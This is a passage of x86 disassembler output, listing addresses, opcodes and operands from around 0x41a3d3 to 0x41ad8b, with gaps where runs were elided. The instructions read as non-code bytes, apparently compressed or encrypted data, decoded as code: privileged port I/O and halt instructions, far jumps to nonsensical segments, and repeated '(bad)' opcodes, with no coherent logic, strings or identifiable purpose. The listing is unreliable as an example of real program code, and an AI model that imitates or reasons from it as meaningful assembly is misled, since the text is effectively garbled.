  41a3d3:	test   edi,ecx
  41a3d5:	test   al,0x46
  41a3d7:	cmc    
  41a3d8:	mov    cl,0xab
  41a3da:	lods   eax,DWORD PTR ds:[esi]
  41a3db:	fwait
  41a3dc:	loop   0x41a42f
  41a3de:	sbb    ebp,ebx
  41a3e0:	imul   esp,DWORD PTR [edi-0x5f407e7f],0x865f0e1e
  41a3ea:	sub    BYTE PTR [edx-0x5d74c663],dl
  41a3f0:	stmxcsr DWORD PTR [esi]
  41a3f3:	add    BYTE PTR [eax-0x6e],0x99
  41a3f7:	fidivr DWORD PTR [edi+0x6e]
  41a3fa:	mov    BYTE PTR [edi],bl
  41a3fc:	mov    al,BYTE PTR [ebp+ebp*4-0x57e03b63]
  41a403:	mov    ds:0x8358687c,al
  41a408:	aam    0xa0
  41a40a:	leave  
  41a40b:	int    0x64
  41a40d:	ss and eax,0xaa81030a
  41a413:	in     eax,dx
  41a414:	in     al,0x37
  41a416:	data16 and BYTE PTR [edi+0x30],al
  41a41a:	rcl    DWORD PTR [esi*2-0x2ed79df],1
  41a421:	dec    ebx
  41a422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a423:	fsub   DWORD PTR [eax-0x9]
  41a426:	arpl   WORD PTR [edx+edi*8],si
  41a429:	xlat   BYTE PTR ds:[ebx]
  41a42a:	push   0x1946cfac
  41a42f:	mov    ds:0x62a24318,al
  41a434:	fcomp  DWORD PTR [esi-0x34]
  41a437:	fwait
  41a438:	sti    
  41a439:	mov    edi,0xf664855f
  41a43e:	add    DWORD PTR [ebx+edx*1],ebx
  41a441:	and    eax,DWORD PTR [ebp+0x5c]
  41a444:	pop    ss
  41a445:	pop    edi
  41a446:	in     al,0xa7
  41a448:	jae    0x41a462
  41a44a:	iret   
  41a44b:	pop    edx
  41a44c:	std    
  41a44d:	pop    ds
  41a44e:	xchg   DWORD PTR [edi],esi
  41a450:	push   esi
  41a451:	mov    BYTE PTR [eax+ecx*8-0x34296fd1],0x13
  41a459:	iret   
  41a45a:	int    0x38
  41a45c:	dec    ebx
  41a45d:	mov    DWORD PTR [ebp+0x497b8d14],edx
  41a463:	dec    ebp
  41a464:	mov    dh,0xf9
  41a466:	cmp    ah,BYTE PTR [ecx]
  41a468:	shr    DWORD PTR [ebp+0x32],0x17
  41a46c:	test   eax,0x4235fc2a
  41a471:	mov    ebp,0x994adcfe
  41a476:	jae    0x41a451
  41a478:	mov    eax,0x4c34a194
  41a47d:	hlt    
  41a47e:	mov    edx,0xd246795
  41a483:	div    BYTE PTR [edi]
  41a485:	in     eax,0x9e
  41a487:	pop    eax
  41a488:	dec    edx
  41a489:	loope  0x41a427
  41a48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a48c:	xor    eax,0x53d17
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	call   0x116:0xecf4e08a
  41a507:	add    BYTE PTR [ecx+eax*1],al
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	mov    cl,0xff
  41a50e:	jle    0x41a516
  41a510:	call   0x24f11c50
  41a515:	xor    eax,DWORD PTR cs:[ebx-0x739c402]
  41a51c:	and    DWORD PTR [ebp+0x3a3ac454],edx
  41a522:	xor    cl,ch
  41a524:	retf   
  41a525:	mov    ah,ch
  41a527:	xor    BYTE PTR [eax-0x16],bh
  41a52a:	mov    ebx,0x3c55d2fb
  41a52f:	mov    WORD PTR [edi],?
  41a531:	pop    ds
  41a532:	ins    DWORD PTR es:[edi],dx
  41a533:	xchg   esi,eax
  41a534:	jl     0x41a4fd
  41a536:	pop    ebx
  41a537:	mov    edx,0xa88c0cee
  41a53c:	dec    eax
  41a53d:	sar    DWORD PTR [edi+0x1440d2a1],1
  41a543:	inc    ecx
  41a544:	in     al,0x49
  41a546:	mov    esi,esp
  41a548:	stc    
  41a549:	jmp    0xa8ff7ad1
  41a54e:	mov    ah,0xcd
  41a550:	mov    dl,0x7
  41a552:	rol    bl,1
  41a554:	call   FWORD PTR [esp+eiz*2-0x47b5343d]
  41a55b:	dec    edx
  41a55c:	push   ds
  41a55d:	aad    0xe8
  41a55f:	test   DWORD PTR [esi+0x7f117118],edi
  41a565:	es hlt 
  41a567:	shr    DWORD PTR [eax],1
  41a569:	or     DWORD PTR ds:0xfc606dd6,0xffffffdc
  41a570:	test   ebx,0xa437a0b1
  41a576:	xor    ebx,ecx
  41a578:	or     DWORD PTR [ebx],0xff08b3be
  41a57e:	in     al,dx
  41a57f:	push   cs
  41a580:	dec    ebx
  41a581:	retf   0x3553
  41a584:	push   es
  41a585:	add    al,0xf0
  41a587:	repnz fsub DWORD PTR [edi]
  41a58a:	push   ebp
  41a58b:	xchg   edx,eax
  41a58c:	aam    0x31
  41a58e:	test   al,0x95
  41a590:	cmp    al,0x8f
  41a592:	mov    bl,0x49
  41a594:	or     BYTE PTR [edx],ch
  41a596:	pushf  
  41a597:	mov    bl,bl
  41a599:	imul   ecx,edx,0xffffffcd
  41a59c:	or     ah,BYTE PTR [edi+edi*1-0x65]
  41a5a0:	call   0x4194:0xc37c9ce3
  41a5a7:	nop
  41a5a8:	and    BYTE PTR [edx],bl
  41a5aa:	dec    ebx
  41a5ab:	mov    dl,0x3d
  41a5ad:	into   
  41a5ae:	out    0x4f,eax
  41a5b0:	inc    edx
  41a5b1:	rcl    BYTE PTR [eax+0x4f92e9d6],cl
  41a5b7:	cmp    ebp,edi
  41a5b9:	adc    eax,0xca91bb97
  41a5be:	addr16 dec ecx
  41a5c0:	jge    0x41a5ef
  41a5c2:	in     al,0xd4
  41a5c4:	das    
  41a5c5:	ret    
  41a5c6:	stos   BYTE PTR es:[edi],al
  41a5c7:	hlt    
  41a5c8:	jnp    0x41a557
  41a5ca:	or     esi,ebp
  41a5cc:	add    dh,BYTE PTR [edx+0x5fb8c1a4]
  41a5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5d3:	mov    dl,0xa7
  41a5d5:	push   0xffffff94
  41a5d7:	aad    0x17
  41a5d9:	mov    ch,0x8
  41a5db:	stos   DWORD PTR es:[edi],eax
  41a5dc:	adc    edx,DWORD PTR [esi-0x512e5415]
  41a5e2:	pop    eax
  41a5e3:	out    0x61,al
  41a5e5:	dec    ebp
  41a5e6:	adc    al,0x4
  41a5e8:	aas    
  41a5e9:	(bad)  
  41a5ea:	stc    
  41a5eb:	icebp  
  41a5ec:	pop    esp
  41a5ed:	dec    ebx
  41a5ee:	ret    
  41a5ef:	inc    ebx
  41a5f0:	push   edx
  41a5f1:	or     DWORD PTR [ebx+0x170165db],eax
  41a5f7:	sti    
  41a5f8:	or     dl,BYTE PTR [edi-0x3f25aca1]
  41a5fe:	jle    0x41a5e9
  41a600:	inc    ebx
  41a601:	xchg   ebx,eax
  41a602:	loop   0x41a5e6
  41a604:	(bad)  
  41a605:	lahf   
  41a606:	iret   
  41a607:	(bad)
  41a60a:	xchg   DWORD PTR [edi+edx*2],esp
  41a60d:	pushf  
  41a60e:	outs   dx,BYTE PTR ds:[esi]
  41a60f:	adc    eax,0x0
	...
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x500da625
  41a682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a683:	dec    ebx
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	push   esp
  41a68d:	mov    eax,ds:0xa8a480df
  41a692:	ins    DWORD PTR es:[edi],dx
  41a693:	xchg   esi,eax
  41a694:	adc    esp,DWORD PTR [ecx+0x53a5033]
  41a69a:	rcl    BYTE PTR [esi],0x5c
  41a69d:	fst    DWORD PTR [edx+esi*1+0x65]
  41a6a1:	sub    ebx,DWORD PTR [ebx+0xd]
  41a6a4:	test   DWORD PTR [eax-0x7e8a6f7c],0x428756f2
  41a6ae:	bnd jnp 0x41a635
  41a6b1:	and    edi,ebp
  41a6b3:	jl     0x41a675
  41a6b5:	out    0x80,al
  41a6b7:	loopne 0x41a6c9
  41a6b9:	rol    BYTE PTR [edx],0xe8
  41a6bc:	xor    eax,0x53972e55
  41a6c1:	popa   
  41a6c2:	or     ah,dl
  41a6c4:	ficomp DWORD PTR ds:0x441644e8
  41a6ca:	popf   
  41a6cb:	or     BYTE PTR [ebp+0x5fca4223],dh
  41a6d1:	inc    edx
  41a6d2:	add    al,0x40
  41a6d4:	stos   BYTE PTR es:[edi],al
  41a6d5:	jno    0x41a727
  41a6d7:	dec    eax
  41a6d8:	call   0x3788:0x7be20993
  41a6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6e0:	lahf   
  41a6e1:	dec    ebp
  41a6e2:	jl     0x41a72a
  41a6e4:	and    dh,bl
  41a6e6:	add    esi,ebp
  41a6e8:	or     eax,0x11c95aba
  41a6ed:	mov    al,ds:0xccb900b0
  41a6f2:	(bad)  
  41a6f3:	jecxz  0x41a730
  41a6f5:	inc    esi
  41a6f6:	data16 outs dx,BYTE PTR ds:[esi]
  41a6f8:	cmp    eax,0xd12342fa
  41a6fd:	pusha  
  41a6fe:	rcr    BYTE PTR [edx],cl
  41a700:	(bad)  
  41a701:	(bad)  
  41a702:	pop    ds
  41a703:	jecxz  0x41a72b
  41a705:	dec    ebp
  41a706:	xchg   ebp,eax
  41a707:	sub    ecx,DWORD PTR [edx-0x2f]
  41a70a:	fs jae 0x41a6bb
  41a70d:	dec    edx
  41a70e:	out    dx,al
  41a70f:	mov    ebx,0x21c23d78
  41a714:	or     eax,0x27deff36
  41a719:	and    ebp,DWORD PTR [ecx-0x56]
  41a71c:	add    ebx,edx
  41a71e:	arpl   WORD PTR [edx+0x39],dx
  41a721:	mov    ecx,0x964912c9
  41a726:	xlat   BYTE PTR ds:[ebx]
  41a727:	lahf   
  41a728:	rcl    BYTE PTR [eax],0x67
  41a72b:	scas   al,BYTE PTR es:[edi]
  41a72c:	sbb    DWORD PTR ds:0x20cf4186,esp
  41a732:	push   ebp
  41a733:	ds push ebx
  41a735:	add    al,0xd7
  41a737:	pop    ebx
  41a738:	mov    BYTE PTR [edi-0x6228f972],bh
  41a73e:	lods   eax,DWORD PTR ds:[esi]
  41a73f:	mov    BYTE PTR [ecx+0x105a37d3],ch
  41a745:	mov    dl,0x52
  41a747:	je     0x41a73f
  41a749:	fnsave [edi-0x78]
  41a74c:	je     0x41a7bc
  41a74e:	xor    eax,0x6dd212e4
  41a753:	in     eax,0x51
  41a755:	int    0xe
  41a757:	cmc    
  41a758:	or     al,0xfb
  41a75a:	mov    ebp,0xa169a8c2
  41a75f:	retf   
  41a760:	sbb    BYTE PTR ds:0xfbcc13d,bh
  41a766:	ja     0x41a7a2
  41a768:	mov    BYTE PTR [edi],ah
  41a76a:	mov    bl,0x2e
  41a76c:	push   0x76c567df
  41a771:	cs inc ecx
  41a773:	jae    0x41a7dd
  41a775:	out    0xfa,eax
  41a777:	xor    eax,0xb994eb2f
  41a77c:	imul   esi,DWORD PTR [ebp-0xf],0x53
  41a780:	adc    ecx,ebx
  41a782:	pop    edx
  41a783:	lods   al,BYTE PTR ds:[esi]
  41a784:	push   esp
  41a785:	es push ecx
  41a787:	mov    dh,BYTE PTR [edi-0xc]
  41a78a:	push   ebp
  41a78b:	sub    esp,DWORD PTR [ecx]
  41a78d:	addr16 add BYTE PTR [bx+si],0x0
	...
  41a7f2:	add    BYTE PTR [eax],al
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x7a5327ca,al
  41a801:	jmp    ecx
  41a803:	out    0xf4,al
  41a805:	sbb    BYTE PTR [ecx],al
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	xor    edx,esi
  41a80e:	div    DWORD PTR [ecx-0x7518e3bf]
  41a814:	sbb    dh,dl
  41a816:	xlat   BYTE PTR ds:[ebx]
  41a817:	inc    esi
  41a818:	fild   QWORD PTR [esp+esi*4]
  41a81b:	in     eax,0x4c
  41a81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a81e:	dec    esp
  41a81f:	mov    ebx,0xb982d141
  41a824:	push   ds
  41a825:	xor    esi,DWORD PTR [esi-0x17be2674]
  41a82b:	cmp    DWORD PTR [edi],0x79
  41a82e:	fstp   DWORD PTR [esi+0x46ca04c5]
  41a834:	pop    edi
  41a835:	mov    ecx,0xa4850ee1
  41a83a:	sub    eax,ebp
  41a83c:	js     0x41a878
  41a83e:	mov    ebx,0xea1283cd
  41a843:	or     DWORD PTR [ebx-0x1d24db66],eax
  41a849:	push   ebp
  41a84a:	xchg   esp,eax
  41a84b:	shl    DWORD PTR [esi+0x22],1
  41a84e:	jg     0x41a819
  41a850:	nop
  41a851:	cmp    ecx,esi
  41a853:	leave  
  41a854:	push   edi
  41a855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a856:	ret    
  41a857:	cmp    ebp,ebp
  41a859:	popa   
  41a85a:	mov    esi,0xb8bd8392
  41a85f:	mov    bh,0xe5
  41a861:	dec    esp
  41a862:	pushf  
  41a863:	out    0x94,eax
  41a865:	jns    0x41a89b
  41a867:	dec    eax
  41a868:	adc    bh,bh
  41a86a:	adc    edx,DWORD PTR [esi]
  41a86c:	sbb    dl,BYTE PTR [ebx]
  41a86e:	sub    BYTE PTR [ebp+edi*8-0x56866c08],ch
  41a875:	jle    0x41a8a3
  41a877:	pop    esi
  41a878:	fwait
  41a879:	or     esp,DWORD PTR gs:[edx]
  41a87c:	sub    eax,0x2b904cac
  41a881:	pop    edi
  41a882:	push   0xffffffb7
  41a884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a885:	cli    
  41a886:	(bad)  
  41a887:	clc    
  41a888:	or     DWORD PTR [eax],edi
  41a88a:	enter  0x15aa,0x3f
  41a88e:	inc    ecx
  41a88f:	dec    ebx
  41a890:	ds jb  0x41a86e
  41a893:	std    
  41a894:	jo     0x41a8bb
  41a896:	vmwrite esi,DWORD PTR [ebp-0x30]
  41a89a:	out    0x47,al
  41a89c:	cwde   
  41a89d:	int3   
  41a89e:	popf   
  41a89f:	jmp    0x7eb11d4f
  41a8a4:	hlt    
  41a8a5:	lods   eax,DWORD PTR ds:[esi]
  41a8a6:	sbb    BYTE PTR [edi+0x12bef409],dh
  41a8ac:	fild   DWORD PTR es:[ecx]
  41a8b0:	shr    BYTE PTR [eax+edx*4+0x7014a25e],0xfe
  41a8b8:	jmp    0x9aaece7e
  41a8bd:	add    ah,dh
  41a8bf:	or     eax,0x4a82bbe1
  41a8c4:	stc    
  41a8c5:	jg     0x41a919
  41a8c7:	int3   
  41a8c8:	xchg   ebx,eax
  41a8c9:	fs sbb eax,0x6da5238a
  41a8cf:	add    WORD PTR [edx+0x3f],di
  41a8d3:	and    BYTE PTR [ebp+ebp*4-0x70],al
  41a8d7:	iret   
  41a8d8:	inc    edi
  41a8d9:	or     al,0xfd
  41a8db:	dec    edi
  41a8dc:	out    0xce,al
  41a8de:	jl     0x41a938
  41a8e0:	jb     0x41a8eb
  41a8e2:	push   0xffffffdc
  41a8e4:	dec    edi
  41a8e5:	and    DWORD PTR [ebx],ebx
  41a8e7:	or     eax,ebp
  41a8e9:	aas    
  41a8ea:	(bad)
  41a8ed:	lods   eax,DWORD PTR ds:[esi]
  41a8ee:	xor    DWORD PTR fs:[ecx+ebp*8-0x562d8022],0x2b
  41a8f7:	mov    ah,0x8
  41a8f9:	out    dx,al
  41a8fa:	clc    
  41a8fb:	mov    ecx,0xe4248507
  41a900:	mov    bh,dh
  41a902:	test   al,0xfd
  41a904:	data16 cmc 
  41a906:	sti    
  41a907:	adc    BYTE PTR [ecx],ch
  41a909:	scas   eax,DWORD PTR es:[edi]
  41a90a:	(bad)  
  41a90b:	fisttp DWORD PTR [edi+0xfcf1c0]
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	mov    WORD PTR [eax+edi*4+0x119f865],fs
  41a987:	add    BYTE PTR [ecx+eax*1],al
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	lods   al,BYTE PTR ds:[esi]
  41a98d:	add    eax,0xb3e61160
  41a992:	rcr    DWORD PTR [ecx-0x3e46ac60],0xb
  41a999:	jmp    0x41a930
  41a99b:	inc    edx
  41a99c:	mov    bh,0xff
  41a99e:	xchg   edx,eax
  41a99f:	push   ds
  41a9a0:	push   0xf710d00b
  41a9a5:	cmp    dl,BYTE PTR ds:0xfafbc448
  41a9ab:	addr16 je 0x41aa0e
  41a9ae:	sub    dh,0x8c
  41a9b1:	add    ch,BYTE PTR [esi]
  41a9b3:	dec    eax
  41a9b4:	pop    es
  41a9b5:	or     eax,0x9316e125
  41a9ba:	push   esp
  41a9bb:	fdivr  DWORD PTR ds:0x7da49997
  41a9c1:	inc    eax
  41a9c2:	mov    edi,0x2e814725
  41a9c7:	pushf  
  41a9c8:	pop    esi
  41a9c9:	pop    ebx
  41a9ca:	aam    0xe2
  41a9cc:	imul   esi,DWORD PTR [ecx+0x430acf3],0x79
  41a9d3:	sbb    esp,DWORD PTR [edx-0x2c]
  41a9d6:	cmp    ebp,0x3dce4ad3
  41a9dc:	aam    0x18
  41a9de:	sbb    DWORD PTR [edx+edx*4-0x161b04ee],edx
  41a9e5:	in     al,dx
  41a9e6:	mov    BYTE PTR [edx],bl
  41a9e8:	cli    
  41a9e9:	cdq    
  41a9ea:	xor    DWORD PTR [edx],ebx
  41a9ec:	jg     0x41aa3d
  41a9ee:	inc    edi
  41a9ef:	popf   
  41a9f0:	and    edi,DWORD PTR [ecx-0x2b]
  41a9f3:	fdiv   DWORD PTR [edx-0x20]
  41a9f6:	into   
  41a9f7:	cmc    
  41a9f8:	jbe    0x41a9c3
  41a9fa:	repz xor al,0x2
  41a9fd:	xor    bl,BYTE PTR [ecx-0x10d784f7]
  41aa03:	add    al,0x10
  41aa05:	test   DWORD PTR [edx-0x65],edx
  41aa08:	mov    dl,0xda
  41aa0a:	scas   eax,DWORD PTR es:[edi]
  41aa0b:	sub    ah,BYTE PTR [eax-0x7f]
  41aa0e:	arpl   WORD PTR [ebx],cx
  41aa10:	ret    
  41aa11:	xchg   ecx,eax
  41aa12:	cli    
  41aa13:	and    DWORD PTR [ebp+0xa],eax
  41aa16:	xchg   BYTE PTR [ebp+0x59d2f5c],al
  41aa1c:	stos   BYTE PTR es:[edi],al
  41aa1d:	sbb    ebp,DWORD PTR [ebx-0x6d]
  41aa20:	adc    eax,0x1faccd52
  41aa25:	xrelease xchg DWORD PTR [edi-0x56641ce7],eax
  41aa2c:	sub    al,0x1f
  41aa2e:	enter  0x474a,0x40
  41aa32:	pop    ecx
  41aa33:	repnz and BYTE PTR [eax+0x18],0x6f
  41aa38:	clc    
  41aa39:	ret    
  41aa3a:	lods   eax,DWORD PTR ds:[esi]
  41aa3b:	push   esp
  41aa3c:	pop    edi
  41aa3d:	and    BYTE PTR [edx+0x75],dh
  41aa40:	fstp   DWORD PTR [esi]
  41aa42:	cli    
  41aa43:	loope  0x41aa82
  41aa45:	retf   0x1740
  41aa48:	nop
  41aa49:	cmp    edx,DWORD PTR ds:0x1c9b1b5e
  41aa4f:	sbb    al,0x9a
  41aa51:	jecxz  0x41aa9c
  41aa53:	call   0x8bbdcd49
  41aa58:	jge    0x41aaae
  41aa5a:	shl    BYTE PTR [eax+ecx*1+0x13592f77],cl
  41aa61:	je     0x41aac1
  41aa63:	xchg   ecx,eax
  41aa64:	inc    edi
  41aa65:	sahf   
  41aa66:	clc    
  41aa67:	cld    
  41aa68:	push   ss
  41aa69:	mov    fs,ecx
  41aa6b:	xor    DWORD PTR [edx],eax
  41aa6d:	lahf   
  41aa6e:	ins    BYTE PTR es:[edi],dx
  41aa6f:	and    BYTE PTR [esi+0x2991096d],dh
  41aa75:	dec    ebp
  41aa76:	cmp    BYTE PTR [eax+0x66bf0506],0x17
  41aa7d:	cdq    
  41aa7e:	mov    al,ds:0x1470aa8e
  41aa83:	aam    0xf7
  41aa85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa86:	cmp    eax,0x3f266c17
  41aa8b:	test   al,0x15
  41aa8d:	pop    ebp
  41aa8e:	enter  0x96,0x0
	...
  41aaf2:	add    BYTE PTR [eax],al
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	jl     0x41aac4
  41ab02:	pop    ds
  41ab03:	dec    ebp
  41ab04:	cld    
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	fidiv  DWORD PTR ds:[esi]
  41ab0f:	imul   eax,DWORD PTR ds:0xdbf514c1,0xffffff8e
  41ab16:	add    eax,DWORD PTR [ebx+0x1b69bb43]
  41ab1c:	retf   0x6a9c
  41ab1f:	mov    ah,0x9b
  41ab21:	inc    esi
  41ab22:	mov    ds:0xebd90384,al
  41ab27:	dec    edi
  41ab28:	mov    bl,0xa7
  41ab2a:	enter  0xb96b,0x40
  41ab2e:	sbb    bh,BYTE PTR [ebx+0x6d]
  41ab31:	ret    
  41ab32:	fidiv  WORD PTR [ecx-0x43]
  41ab35:	in     eax,0xd2
  41ab37:	adc    eax,0xa3f1f001
  41ab3c:	loop   0x41aae6
  41ab3e:	js     0x41ab30
  41ab40:	push   ebx
  41ab41:	aas    
  41ab42:	imul   esp,DWORD PTR [edi-0x75],0x273525ed
  41ab49:	mov    bl,0xf7
  41ab4b:	cmp    bh,BYTE PTR [ecx+0x26d68436]
  41ab51:	outs   dx,DWORD PTR ds:[esi]
  41ab52:	xchg   ebp,eax
  41ab53:	add    dh,BYTE PTR [edx]
  41ab55:	mov    dh,0x51
  41ab57:	mov    ebp,0x6722b15e
  41ab5c:	xor    BYTE PTR [edi+0x4d],ch
  41ab5f:	xchg   ebp,eax
  41ab60:	cs mov ebx,0x924af12a
  41ab66:	cmp    ch,BYTE PTR [edi+0x5]
  41ab69:	popa   
  41ab6a:	cmp    DWORD PTR [ebx+edi*1+0x1c1b106f],esp
  41ab71:	mov    WORD PTR [edi-0x39451aef],cs
  41ab77:	enter  0xcd64,0xd7
  41ab7b:	xor    al,0xdc
  41ab7d:	add    al,0x8e
  41ab7f:	(bad)  
  41ab80:	mov    ds,WORD PTR [eax]
  41ab82:	xchg   al,al
  41ab84:	jmp    0x41ab41
  41ab86:	cmc    
  41ab87:	jg     0x41ab95
  41ab89:	mov    al,0x13
  41ab8b:	aam    0x23
  41ab8d:	clc    
  41ab8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab8f:	push   ss
  41ab90:	data16 mov ch,BYTE PTR [eax-0x22]
  41ab94:	pop    ebp
  41ab95:	adc    ah,BYTE PTR [ebx]
  41ab97:	adc    BYTE PTR [ecx+0x2e],dh
  41ab9a:	mov    edx,0x38ccb682
  41ab9f:	arpl   ax,bx
  41aba1:	dec    esi
  41aba2:	adc    BYTE PTR [esi+0x38],cl
  41aba5:	jmp    DWORD PTR [edi-0x2b616f91]
  41abab:	call   FWORD PTR [eax+0x37]
  41abae:	inc    edx
  41abaf:	adc    edi,ebx
  41abb1:	test   DWORD PTR [edx-0x5c],ecx
  41abb4:	xor    al,0x57
  41abb6:	push   ebx
  41abb7:	adc    al,0xbf
  41abb9:	jecxz  0x41abdf
  41abbb:	jmp    0x41abb6
  41abbd:	test   eax,0x3007f123
  41abc2:	inc    esp
  41abc3:	out    0x3b,eax
  41abc5:	xchg   BYTE PTR [ecx],al
  41abc7:	loope  0x41abdc
  41abc9:	outs   dx,DWORD PTR ds:[esi]
  41abca:	mov    bh,0xaf
  41abcc:	scas   al,BYTE PTR es:[edi]
  41abcd:	fisub  WORD PTR [ebx+0x30d56308]
  41abd3:	or     eax,0xf2470790
  41abd8:	xor    eax,0xdb907227
  41abdd:	stc    
  41abde:	push   bp
  41abe0:	jmp    0x49ea:0x2398716f
  41abe7:	sub    DWORD PTR es:[edx-0xd1e2c4b],0x70
  41abef:	xchg   ecx,eax
  41abf0:	cmp    dl,0x99
  41abf3:	mov    eax,ds:0xfb18f8bd
  41abf8:	test   DWORD PTR [eax],edx
  41abfa:	adc    BYTE PTR [esi-0x31],ah
  41abfd:	xchg   esp,eax
  41abfe:	dec    edx
  41abff:	rcr    bl,cl
  41ac01:	inc    esi
  41ac02:	sub    cl,BYTE PTR [ebx-0x57f97692]
  41ac08:	(bad)  
  41ac09:	addr16 push ss
  41ac0b:	pop    edi
  41ac0c:	cmp    DWORD PTR [edx],esp
  41ac0e:	mov    es,WORD PTR [bx+si]
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [edi+edi*2-0x25]
  41ac82:	xor    eax,0x11c0022
  41ac87:	add    BYTE PTR [ecx+eax*1],al
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	cmp    esi,ebx
  41ac8e:	aaa    
  41ac8f:	test   eax,0x5c270979
  41ac94:	sbb    al,BYTE PTR [edx+0x2]
  41ac97:	dec    esi
  41ac98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac99:	test   al,0xb0
  41ac9b:	xor    ecx,0x47
  41ac9e:	shr    ch,cl
  41aca0:	and    dl,BYTE PTR [edx-0x230869d9]
  41aca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aca7:	sub    edx,DWORD PTR [esi]
  41aca9:	and    al,0x6f
  41acab:	popa   
  41acac:	pop    edx
  41acad:	fnsave [edi+0x1a7c6a90]
  41acb3:	cdq    
  41acb4:	les    eax,FWORD PTR [edi-0x44]
  41acb7:	mov    al,ds:0x47f94006
  41acbc:	xchg   ecx,eax
  41acbd:	retf   
  41acbe:	add    eax,0xbd10bf24
  41acc3:	lods   al,BYTE PTR ds:[esi]
  41acc4:	or     al,0x84
  41acc6:	cmc    
  41acc7:	mov    edi,0x75a1289c
  41accc:	into   
  41accd:	dec    esi
  41acce:	jnp    0x41ac59
  41acd0:	repz xor eax,DWORD PTR [edx-0x4]
  41acd4:	loop   0x41ac8c
  41acd6:	dec    ebx
  41acd7:	pop    ecx
  41acd8:	jne    0x41ad12
  41acda:	fisubr DWORD PTR [ebx]
  41acdc:	sti    
  41acdd:	or     ebx,DWORD PTR [ecx]
  41acdf:	jmp    0x46eaac95
  41ace4:	mov    dl,0x9c
  41ace6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ace7:	mov    cl,0x67
  41ace9:	jmp    0x8651:0x87e30367
  41acf0:	add    eax,0x8e00a8f0
  41acf5:	sub    esp,DWORD PTR [eax]
  41acf7:	call   0xc66e:0x8fbb3fbd
  41acfe:	adc    al,0x5d
  41ad00:	(bad)  
  41ad01:	sub    DWORD PTR [eax],ebx
  41ad03:	dec    edx
  41ad04:	(bad)  
  41ad05:	push   ecx
  41ad06:	add    ch,cl
  41ad08:	lods   eax,DWORD PTR ds:[esi]
  41ad09:	fist   DWORD PTR [ecx+0x7662448c]
  41ad0f:	sub    ebx,0xffffffa9
  41ad12:	popf   
  41ad13:	add    al,0xc0
  41ad15:	cli    
  41ad16:	mov    ebp,0x22a7ed38
  41ad1b:	jb     0x41ad77
  41ad1d:	retf   0x4b37
  41ad20:	dec    ebx
  41ad21:	into   
  41ad22:	bound  esp,QWORD PTR [ebx+0x54047556]
  41ad28:	xor    dh,BYTE PTR [ecx+ebx*4-0x3b7d0b48]
  41ad2f:	inc    ebx
  41ad30:	and    DWORD PTR [edx],esi
  41ad32:	retf   0x3976
  41ad35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad36:	xchg   edx,eax
  41ad37:	sbb    eax,0x8cf3e25
  41ad3c:	enter  0xf868,0xd2
  41ad40:	hlt    
  41ad41:	scas   al,BYTE PTR es:[edi]
  41ad42:	push   cs
  41ad43:	jg     0x41ad75
  41ad45:	pushf  
  41ad46:	dec    edi
  41ad47:	js     0x41ad06
  41ad49:	add    edx,DWORD PTR [edx-0x7d]
  41ad4c:	sub    BYTE PTR [esi-0x4251bdf4],bl
  41ad52:	push   ss
  41ad53:	mov    esi,0xbcc8e4b0
  41ad58:	adc    BYTE PTR [ebx+0x6944d6bc],al
  41ad5e:	shl    DWORD PTR [eax],cl
  41ad60:	inc    esi
  41ad61:	lock jmp 0x8649:0x46b056ea
  41ad69:	or     al,0xce
  41ad6b:	cld    
  41ad6c:	push   eax
  41ad6d:	dec    ebp
  41ad6e:	cmc    
  41ad6f:	into   
  41ad70:	xor    al,0xf2
  41ad72:	repz and eax,0xa90eff9b
  41ad78:	or     al,0xc1
  41ad7a:	jmp    0x41add7
  41ad7c:	pop    ebx
  41ad7d:	xor    eax,DWORD PTR [ebp-0x40a5660]
  41ad83:	pop    esi
  41ad84:	adc    al,0x5d
  41ad86:	mov    ds:0x590fcfe8,eax
  41ad8b:	inc    edi
